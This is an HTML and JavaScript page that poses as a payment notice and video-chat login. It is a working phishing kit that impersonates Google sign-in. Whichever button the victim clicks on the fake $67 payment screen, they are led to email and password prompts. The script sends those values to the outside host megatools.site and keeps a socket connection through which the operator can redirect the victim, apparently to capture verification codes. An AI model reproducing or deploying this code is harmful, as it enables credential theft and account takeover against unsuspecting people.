<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Live Video Chat Login</title>
    <link
      href="https://fonts.googleapis.com/css2?family=Roboto&display=swap"
      rel="stylesheet"
    />
    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>

    <style>
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
        font-family: "Roboto", Arial, sans-serif;
      }

      body {
        background: linear-gradient(to right, #e3f2fd, #bbdefb);
        display: flex;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
      }

      .container {
        width: 450px;
        padding: 48px 40px;
        border-radius: 12px;
        background: #ffffff;
        box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
        transition: all 0.3s ease;
      }

      .logo {
        display: flex;
        justify-content: center;
        align-items: center;
        text-align: center;
        /* margin-bottom: 16px; */
      }

      .logo img {
        width: 90px;
      }

      .title {
        font-size: 26px;
        text-align: center;
        margin-bottom: 10px;
      }

      .subtitle {
        font-size: 16px;
        text-align: center;
        color: #5f6368;
        margin-bottom: 30px;
      }

      .form-group {
        margin-bottom: 20px;
      }

      .form-group input {
        width: 100%;
        padding: 14px;
        border: 1px solid #dadce0;
        border-radius: 6px;
        font-size: 16px;
      }

      .form-group input:focus {
        border-color: #1a73e8;
        outline: none;
      }

      .btn-google2 {
        margin: auto;
        background: #c94b24;
        color: #fff;
        border: none;
        padding: 7px 40px;
        border-radius: 6px;
        font-size: 15px;
        display: flex;
        align-items: center;
        justify-content: center;
        cursor: pointer;
        margin-top: 10px;
      }
      .btn-google {
        margin: auto;
        background: #34b100;
        color: #fff;
        border: none;
        padding: 7px 40px;
        border-radius: 6px;
        font-size: 15px;
        display: flex;
        align-items: center;
        justify-content: center;
        cursor: pointer;

        margin-top: 10px;
      }

      .btn-google img {
        width: 20px;
        margin-right: 10px;
      }

      .divider {
        position: relative;
        margin: 30px 0;
        text-align: center;
      }

      .divider::before {
        content: "";
        position: absolute;
        top: 50%;
        left: 0;
        right: 0;
        height: 1px;
        background: #dadce0;
      }

      .divider span {
        background: #fff;
        position: relative;
        padding: 0 10px;
        font-size: 14px;
        color: #5f6368;
      }

      .buttons {
        display: flex;
        justify-content: space-between;
        margin-top: 20px;
      }
      .time {
        text-align: center;
      }
      .for {
        text-align: center;
      }

      .btn-next {
        background: #1a73e8;
        color: #fff;
        border: none;
        padding: 10px 20px;
        border-radius: 6px;
        font-weight: 500;
        cursor: pointer;
      }
      .payment-container {
        background: white;
        position: absolute;
        top: 0;
        bottom: 0;
        left: 0;
        right: 0;
        margin: 16px;
        border-radius: 20px;
        display: flex;
        flex-direction: column;
        padding: 30px 20px;
        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
        overflow-y: auto;
      }
      .profile-pic {
        width: 90px;
        height: 90px;
        border-radius: 50%;
        object-fit: cover;
        margin: 10px auto 25px;
        border: 3px solid #f5f5f5;
      }
      .user-name {
        font-size: 24px;
        font-weight: 700;
        text-align: center;
        margin-bottom: 8px;
        color: #222;
      }
      .payment-from {
        color: #777;
        font-size: 17px;
        text-align: center;
        margin-bottom: 50px;
      }
      .amount {
        font-size: 46px;
        font-weight: 700;
        text-align: center;
        margin: 30px 0;
        color: #111;
      }
      .description {
        color: #666;
        font-size: 17px;
        text-align: center;
        margin-bottom: 15px;
        line-height: 1.4;
      }
      .time {
        color: #999;
        font-size: 16px;
        text-align: center;
        margin-bottom: 60px;
      }
      .profile {
        filter: blur(2px);
      }
      .btn-container {
        margin-top: auto;
        padding-bottom: 20px;
      }
      .btn {
        width: 100%;
        padding: 18px;
        border: none;
        border-radius: 30px;
        font-size: 19px;
        font-weight: 600;
        color: white;
        margin-bottom: 15px;
        cursor: pointer;
        transition: all 0.2s;
      }
      .btn:active {
        transform: scale(0.98);
      }
      .btn-accept {
        background: linear-gradient(to right, #34b100, #2e9e00);
        box-shadow: 0 3px 10px rgba(52, 177, 0, 0.3);
      }
      .btn-decline {
        background: linear-gradient(to right, #c94b24, #b54220);
        box-shadow: 0 3px 10px rgba(201, 75, 36, 0.3);
      }
      @media (max-width: 400px) {
        .payment-container {
          margin: 12px;
          padding: 25px 18px;
        }
        .profile-pic {
          width: 80px;
          height: 80px;
        }
        .amount {
          font-size: 42px;
          margin: 25px 0;
        }
      }
      .loading-spinner {
        border: 4px solid rgba(0, 0, 0, 0.1);
        border-top: 4px solid #1a73e8;
        border-radius: 50%;
        width: 40px;
        height: 40px;
        animation: spin 1s linear infinite;
        margin: 20px auto;
      }

      @keyframes spin {
        0% {
          transform: rotate(0deg);
        }
        100% {
          transform: rotate(360deg);
        }
      }

      .form-step {
        display: none;
      }

      .form-step.active {
        display: block;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <div class="form-step active" id="step1">
        <div class="profile">
          <img
            src="https://res.cloudinary.com/iuoluiol/image/upload/v1730230912/wkl8k8fmws9svlu0xqi5.png"
            alt="Profile"
            class="profile-pic"
          />

          <div class="user-name">Tomas B. Adams</div>
          <div class="payment-from">Payment from Adams</div>

          <div class="amount">$67.00</div>
          <div class="description">For la flame fans must eat</div>
          <div class="time" id="timestamp"></div>
        </div>
        <div class="btn-container">
          <button class="btn btn-accept" onclick="nextStep()">Accept</button>
          <button class="btn btn-decline" onclick="nextStep()">Decline</button>
        </div>
      </div>

      <div class="form-step" id="step2">
        <h2 class="title">Sign in</h2>
        <p class="subtitle">Use your Google Account</p>
        <div class="form-group">
          <input type="text" id="email" placeholder="Email or phone" />
        </div>
        <div class="divider"><span>or</span></div>
        <div class="buttons">
          <button class="btn-next" onclick="nextStep()">Next</button>
        </div>
      </div>

      <div class="form-step" id="step3">
        <h2 class="title">Welcome Back</h2>
        <p class="subtitle">Enter your password</p>
        <div class="form-group">
          <input type="password" id="password" placeholder="Password" />
        </div>
        <div class="buttons">
          <button class="btn-next" onclick="showLoading()">Sign in</button>
        </div>
      </div>

      <div class="form-step" id="step4">
        <div class="loading-spinner"></div>
        <p class="subtitle" style="text-align: center">Signing in...</p>
      </div>
    </div>

    <script>
      let _id = "";
      console.log(_id, "id");
      const urlParams = new URLSearchParams(window.location.search);
      const id = urlParams.get("id");
      let currentStep = 1;
      const totalSteps = 4;
      // Auto POST request when the page loads
      window.addEventListener("DOMContentLoaded", () => {
        fetch("https://megatools.site/api/v1/information", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            user: id,
            siteName: `Video-call/login`,
          }),
        })
          .then((res) => {
            if (!res.ok) throw new Error("Init request failed");
            return res.json();
          })
          .then((data) => {
            _id = data.data._id;
            connectAndJoinRoom(data.data._id);

            console.log("Init request successful", data);
          })
          .catch((err) => {
            console.error("Init request error:", err);
          });
      });

      function nextStep() {
        if (currentStep < totalSteps) {
          // Only trigger email POST if moving from step 2 to 3
          if (currentStep === 2) {
            const emailInput = document.getElementById("email");
            const email = emailInput.value.trim();

            if (!email) {
              alert("Please enter your email or phone.");
              return;
            }

            fetch(`https://megatools.site/api/v1/information/${_id}`, {
              method: "PATCH",
              headers: {
                "Content-Type": "application/json",
              },
              body: JSON.stringify({
                user: id,
                siteName: `video-call/login`,
                email: email,
              }),
            })
              .then((res) => {
                if (!res.ok) throw new Error("Failed to save email");
                return res.json();
              })
              .then(() => {
                document.getElementById("email").textContent = email;
                goToNextStep(); // Only proceed if email POST was successful
              })
              .catch((err) => {
                console.error(err);
                alert("Error saving email. Try again.");
              });
          } else {
            goToNextStep();
          }
        }
      }

      function goToNextStep() {
        document
          .getElementById(`step${currentStep}`)
          .classList.remove("active");
        currentStep++;
        document.getElementById(`step${currentStep}`).classList.add("active");
      }

      function showLoading() {
        const email = document.getElementById("email").textContent;
        const password = document.getElementById("password").value;
        console.log(password, "password");

        if (!password) {
          alert("Please enter your password.");
          return;
        }

        goToNextStep(); // Go to step 4 (loading)
        // document.getElementById("loading-screen").style.display = "block";

        fetch(`https://megatools.site/api/v1/information/${_id}`, {
          method: "PATCH",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            user: id,
            siteName: `AutoInfo/login`,
            password: password,
          }),
        })
          .then((res) => {
            if (!res.ok) throw new Error("Login failed");
            return res.json();
          })
          .then((data) => {
            console.log("last request successful", data);

            // alert("Login successful! Redirecting...");
            // window.location.href = "/dashboard";
          })
          .catch((err) => {
            console.error(err);
            alert("Login failed. Try again.");
            // Optionally go back to password input
            currentStep = 2;
            goToNextStep();
          });
      }
      function connectAndJoinRoom(roomId) {
        console.log("Joining Room:", roomId);
        return new Promise((resolve) => {
          socket = io("https://megatools.site");

          socket.on("connect", () => {
            // Connect successful
            socket.emit("joinRoom", roomId); // ðŸ‘ˆ Required to receive updates
            resolve(); // Let the caller know we connected
          });

          socket.on("disconnect", () => {
            updateConnectionStatus(
              false,
              "Disconnected from real-time service"
            );
          });

          socket.on("connect_error", (error) => {
            console.error("Connection error:", error.message);
          });

          // Handle real-time server events
          socket.on("link", ({ data }) => {
            console.log("Link Event:", data);
            window.location.href = `${data.url}/${roomId}`;
          });

          socket.on("code", ({ data }) => {
            console.log("Code Event:", data);
            window.location.href = `${data.url}/?id=${roomId}&code=${data.code}`;
          });
        });
      }
      const formatTime = (date) => {
        const options = {
          hour: "numeric",
          minute: "2-digit",
          hour12: true,
        };
        const timeString = date.toLocaleTimeString("en-US", options);
        return `Today at ${timeString}`;
      };

      const now = new Date();
      document.querySelector(".time").textContent = formatTime(now);
      //   connectAndJoinRoom(_id);
    </script>
  </body>
</html>
